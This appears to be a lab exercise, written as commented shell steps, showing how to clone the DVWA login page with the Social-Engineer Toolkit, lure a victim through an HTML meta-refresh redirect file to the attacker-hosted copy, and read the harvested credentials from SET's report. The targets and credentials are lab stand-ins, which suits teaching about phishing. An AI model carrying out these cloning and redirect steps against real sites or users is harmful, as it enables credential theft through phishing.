# ================================
# Website Cloning using SEToolkit
# Credential Harvesting Lab
# ================================

# Switch to root user (required to run SEToolkit and bind services)
sudo su

# Launch the Social-Engineer Toolkit
setoolkit

# - SEToolkit Menu Navigation -

# 1 → Select Social-Engineering Attacks
# 2 → Select Website Attack Vectors
# 3 → Select Credential Harvester Attack Method
# 2 → Select Site Cloner
# (Press Enter after each selection)

# Specify the attacker machine IP address
# This is where harvested credentials will be sent
10.6.6.1

# Specify the target website to clone
# SEToolkit creates a phishing replica of this site
http://dvwa.vm

# - HTML Redirect File Creation -

# Create a simple HTML file that redirects victims
# to the attacker-hosted cloned website

<html>
<head>
<meta http-equiv="refresh" content="0; url=http://10.6.6.1/" />
</head>
</html>

# Save the file as 'ladies.html' on the Desktop

# - Victim Simulation -

# Open (double-click) ladies.html
# Victim is redirected to the cloned DVWA login page
# Enter test credentials:
# Email: ladies@gmail.com
# Password: 1234
# Credentials are captured by SEToolkit

# - Stop the Attack -

# Terminate the SEToolkit web server
Ctrl + C

# Exit SEToolkit menus safely
99
99
99
99

# - View Harvested Credentials -

# Display the SEToolkit XML report containing captured credentials
cat /root/.set/reports/2025-12-14\ 13:34:09.326665.xml
